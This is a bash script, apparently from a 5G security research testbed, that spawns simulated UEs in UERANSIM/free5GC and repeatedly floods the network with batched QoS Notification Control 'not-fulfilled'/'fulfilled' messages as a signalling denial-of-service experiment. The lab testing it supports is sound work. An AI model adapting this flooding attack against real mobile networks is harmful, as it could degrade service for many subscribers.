#!/bin/bash
# QNC Attack Script
# Usage: ./qnc_attack.sh [X_UES] [AW] [HYSTERESIS] [DURATION]
#
# IMSIs ATTACK_START–ATTACK_END are reserved exclusively for this script.
# The Poisson simulation must NOT use that IMSI range.

X_UES=${1:-25}
AW_RAW=${2:-10s}
HYSTERESIS_RAW=${3:-5s}
DURATION_RAW=${4:-300s}

CLI="/ueransim_free5gc/nr-cli"
CONFIG_DIR="/ueransim_free5gc/config/ues"
IMSI_PREFIX="20893000000"
ATTACK_START=700
ATTACK_END=999
ROUNDS_PER_PHASE=7
LOCK_FILE="/tmp/nrcli.lock"

# -- Pacing: launch UEs in waves to avoid flooding the gNB -------------------
BATCH_SIZE=25        # how many nr-ue processes to spawn per wave
BATCH_DELAY_S=15     # seconds to wait between waves

# -- Registration polling -----------------------------------------------------
REG_POLL_S=2         # seconds between ue-list polls
REG_MAX_S=180        # give up waiting after this many seconds

# =============================================================================

MAX_ATTACK_UES=$(( ATTACK_END - ATTACK_START + 1 ))
if [ "$X_UES" -gt "$MAX_ATTACK_UES" ]; then
    echo "ERROR: X_UES ($X_UES) exceeds reserved pool ($MAX_ATTACK_UES)"
    exit 1
fi

# -- Unit parser: accepts "500ms", "5s", or bare seconds ----------------------
parse_time() {
    local v=$1
    if echo "$v" | grep -q "ms$"; then
        awk "BEGIN {printf \"%.3f\", ${v%ms}/1000}"
    elif echo "$v" | grep -q "s$"; then
        echo "${v%s}"
    else
        echo "$v"
    fi
}

AW=$(parse_time "$AW_RAW")
HYSTERESIS=$(parse_time "$HYSTERESIS_RAW")
DURATION=$(parse_time "$DURATION_RAW")
DURATION_INT=$(echo "$DURATION" | cut -d'.' -f1)

# -- Serialised nr-cli: every call holds the same flock as Poisson scripts ----
# flock -w 15: give up after 15 s rather than blocking forever when Poisson
# scripts hold the lock during a burst of 150+ simultaneous registrations.
nrcli()      { flock -w 15 "$LOCK_FILE" "$CLI" "$@"; }
# Polling reads (ue-list) don't need mutual exclusion — each nr-cli call uses
# its own socket connection to the gNB; concurrent reads can't corrupt state.
nrcli_poll() { timeout 60 "$CLI" "$@" 2>/dev/null; }

# -- Cleanup on exit / Ctrl-C -------------------------------------------------
ATTACK_PIDS=()
cleanup() {
    echo ""
    echo "[CLEANUP] Stopping ${#ATTACK_PIDS[@]} attack UE processes..."
    for pid in "${ATTACK_PIDS[@]}"; do kill "$pid" 2>/dev/null; done
    wait 2>/dev/null
    echo "[CLEANUP] Done."
}
trap cleanup EXIT INT TERM

# =============================================================================
# 1. Discover gNB
# =============================================================================
GNB=$(nrcli -d 2>/dev/null | grep "gnb" | awk '{print $1}' | head -1)
[ -z "$GNB" ] && { echo "ERROR: No gNB found"; exit 1; }
echo "GNB: $GNB"

# =============================================================================
# 2. Snapshot UE IDs that are ALREADY connected before we launch attack UEs.
#    Any UE that appears after this point and before the end of the wait window
#    will be captured in the diff — attack UEs and any racing Poisson UEs alike.
#    The C++ guards handle the Poisson ones safely.
# =============================================================================
echo "Snapshotting pre-existing UE state..."
PRE_COUNT=$(nrcli_poll "$GNB" --exec "ue-count" | tr -d '[:space:]')
[ -z "$PRE_COUNT" ] && PRE_COUNT=0
MAX_ID_BEFORE=$(nrcli_poll "$GNB" --exec "ue-range" | awk '{print $2}')
[ -z "$MAX_ID_BEFORE" ] && MAX_ID_BEFORE=0
echo "  Pre-existing UEs: $PRE_COUNT  (max ID so far: $MAX_ID_BEFORE)"

# =============================================================================
# 3. Launch attack UEs in paced batches.
#    Large bursts (e.g. 300 simultaneous) can overwhelm the gNB's RRC task;
#    batching keeps the registration pipeline manageable.
# =============================================================================
echo "Launching $X_UES attack UEs in batches of $BATCH_SIZE..."
launched=0
for i in $(seq 1 $X_UES); do
    UE_NUM=$(printf "%04d" $(( ATTACK_START + i - 1 )))
    YAML="$CONFIG_DIR/uecfg-${IMSI_PREFIX}${UE_NUM}.yaml"
    if [ ! -f "$YAML" ]; then
        echo "  WARNING: $YAML not found, skipping"
        continue
    fi
    /ueransim_free5gc/nr-ue -c "$YAML" -n 1 >/dev/null 2>&1 &
    ATTACK_PIDS+=($!)
    launched=$(( launched + 1 ))

    # After every BATCH_SIZE processes, pause so the gNB can catch up
    if [ $(( launched % BATCH_SIZE )) -eq 0 ] && [ $launched -lt $X_UES ]; then
        echo "  Wave done ($launched launched). Waiting ${BATCH_DELAY_S}s..."
        sleep "$BATCH_DELAY_S"
    fi
done
echo "  Launched $launched processes."

# =============================================================================
# 4. Poll with ue-count until the total increases by at least $launched.
#    ue-count is a tiny response (one integer) — never hangs regardless of
#    how many UEs are connected.  ue-list was unusable at 360+ UEs.
# =============================================================================
echo "Waiting for $launched UEs to register (max ${REG_MAX_S}s)..."
T_WAIT=$(date +%s)
NB_NEW=0
while true; do
    COUNT_NOW=$(nrcli_poll "$GNB" --exec "ue-count" | tr -d '[:space:]')
    if [ -n "$COUNT_NOW" ]; then
        NB_NEW=$(( COUNT_NOW - PRE_COUNT ))
        [ "$NB_NEW" -lt 0 ] && NB_NEW=0
    fi

    ELAPSED_W=$(( $(date +%s) - T_WAIT ))
    echo "  [${ELAPSED_W}s] Registered: $NB_NEW / $launched  (total: ${COUNT_NOW:-?})"
    [ "$NB_NEW" -ge "$launched" ] && { echo "  All $launched UEs registered."; break; }

    if [ "$ELAPSED_W" -ge "$REG_MAX_S" ]; then
        echo "  WARNING: Only $NB_NEW/$launched UEs registered after ${REG_MAX_S}s — continuing."
        break
    fi
    sleep "$REG_POLL_S"
done

# =============================================================================
# 5. Compute the batch range using ue-range.
#    FIRST_UE_ID = MAX_ID_BEFORE + 1  (IDs are monotonic, never reused)
#    LAST_UE_ID  = current max ID from ue-range
#    SPAN        = LAST - FIRST + 1
#
#    All attack UEs registered after the snapshot are guaranteed inside this
#    range.  Any interleaved Poisson UEs are skipped by the C++ guards.
# =============================================================================
RANGE_OUT=$(nrcli_poll "$GNB" --exec "ue-range")
MAX_ID_AFTER=$(echo "$RANGE_OUT" | awk '{print $2}')
[ -z "$MAX_ID_AFTER" ] || [ "$MAX_ID_AFTER" -eq 0 ] && {
    echo "ERROR: ue-range returned no data."
    exit 1
}

FIRST_UE_ID=$(( MAX_ID_BEFORE + 1 ))
LAST_UE_ID=$MAX_ID_AFTER
SPAN=$(( LAST_UE_ID - FIRST_UE_ID + 1 ))

echo ""
echo "  First ID : $FIRST_UE_ID"
echo "  Last  ID : $LAST_UE_ID"
echo "  Span     : $SPAN"

# =============================================================================
# 6. Auto-detect PSI and QFI by probing new UEs until one with a QNC flow
#    is found.  NEW_IDS may contain interleaved Poisson UEs (no QNC) so we
#    must not stop at the first ID — try up to 20 candidates.
# =============================================================================
echo "Detecting PSI / QFI (probing up to 20 UEs from FIRST_UE_ID=$FIRST_UE_ID)..."
PSI=1
QFI=""
QFI_UE=""
for offset in $(seq 0 19); do
    probe=$(( FIRST_UE_ID + offset ))
    [ "$probe" -gt "$LAST_UE_ID" ] && break
    for Q in 2 1 3; do
        R=$(nrcli "$GNB" --exec "qnc-notify $probe $PSI $Q not-fulfilled" 2>/dev/null)
        if echo "$R" | grep -q "Sent"; then
            nrcli "$GNB" --exec "qnc-notify $probe $PSI $Q fulfilled" >/dev/null 2>&1
            QFI=$Q
            QFI_UE=$probe
            break 2
        fi
    done
    echo "  UE $probe: no QNC flow (Poisson UE or not ready), trying next..."
done
[ -z "$QFI" ] && { echo "ERROR: No QNC flow found in first 20 IDs from FIRST_UE_ID (PSI=$PSI)"; exit 1; }
echo "  Detected PSI=$PSI QFI=$QFI on UE $QFI_UE"

echo ""
echo "========================================"
echo " GNB             : $GNB"
echo " ID range        : $FIRST_UE_ID – $LAST_UE_ID  (span=$SPAN)"
echo " New UEs seen    : ${#NEW_IDS[@]}"
echo " PSI / QFI       : $PSI / $QFI"
echo " AW              : ${AW_RAW}  (${AW}s)"
echo " HYSTERESIS      : ${HYSTERESIS_RAW}  (${HYSTERESIS}s)"
echo " DURATION        : ${DURATION_RAW}  (${DURATION_INT}s)"
echo " Rounds/phase    : $ROUNDS_PER_PHASE"
echo " Lock file       : $LOCK_FILE"
echo "========================================"
echo ""

# =============================================================================
# 7. Main attack loop
# =============================================================================
SCRIPT_START=$(date +%s)
PHASE=0
TOTAL_NOTIF=0

while true; do
    ELAPSED=$(( $(date +%s) - SCRIPT_START ))
    [ "$ELAPSED" -ge "$DURATION_INT" ] && { echo "Duration reached (${ELAPSED}s)."; break; }

    PHASE=$(( PHASE + 1 ))
    echo ""
    echo "=== Phase $PHASE  (elapsed=${ELAPSED}s) ==="

    ROUND=0
    while [ $ROUND -lt $ROUNDS_PER_PHASE ]; do
        ELAPSED=$(( $(date +%s) - SCRIPT_START ))
        [ "$ELAPSED" -ge "$DURATION_INT" ] && { echo "Duration reached."; break 2; }

        ROUND=$(( ROUND + 1 ))
        T0=$(date +%s%3N)
        RESULT=$(nrcli "$GNB" --exec \
            "qnc-notify-batch $FIRST_UE_ID $SPAN $PSI $QFI not-fulfilled 1 0" \
            2>/dev/null)
        MS=$(( $(date +%s%3N) - T0 ))
        TOTAL_NOTIF=$(( TOTAL_NOTIF + SPAN ))

        echo "[$(date '+%H:%M:%S')] phase=$PHASE round=$ROUND/$ROUNDS_PER_PHASE" \
             "span=$SPAN ms=$MS total=$TOTAL_NOTIF  $RESULT"
        sleep "$AW"
    done

    ELAPSED=$(( $(date +%s) - SCRIPT_START ))
    [ "$ELAPSED" -ge "$DURATION_INT" ] && break

    echo "[$(date '+%H:%M:%S')] Hysteresis ${HYSTERESIS_RAW} — sending fulfilled..."
    RESULT=$(nrcli "$GNB" --exec \
        "qnc-notify-batch $FIRST_UE_ID $SPAN $PSI $QFI fulfilled 1 0" \
        2>/dev/null)
    echo "[$(date '+%H:%M:%S')] $RESULT"
    sleep "$HYSTERESIS"
done

TOTAL_TIME=$(( $(date +%s) - SCRIPT_START ))
echo ""
echo "========================================"
echo " Done"
echo " Phases          : $PHASE"
echo " ID range        : $FIRST_UE_ID – $LAST_UE_ID"
echo " Total notif     : $TOTAL_NOTIF"
echo " Duration        : ${TOTAL_TIME}s"
echo "========================================"
